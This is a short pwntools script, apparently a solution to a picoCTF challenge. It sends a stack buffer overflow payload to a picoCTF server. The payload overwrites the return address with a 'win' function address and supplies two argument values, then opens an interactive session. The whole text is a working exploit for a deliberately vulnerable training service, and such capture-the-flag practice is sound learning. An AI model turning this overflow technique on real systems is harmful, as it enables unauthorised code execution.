from pwn import *

p = remote('saturn.picoctf.net', 60086)

win_addr=p32(0x08049296)

payload = b'A'*(100+12)
payload += win_addr
payload += b'A'*4
payload += p32(0xCAFEF00D)
payload += p32(0xF00DF00D)

p.sendline(payload)
p.interactive()
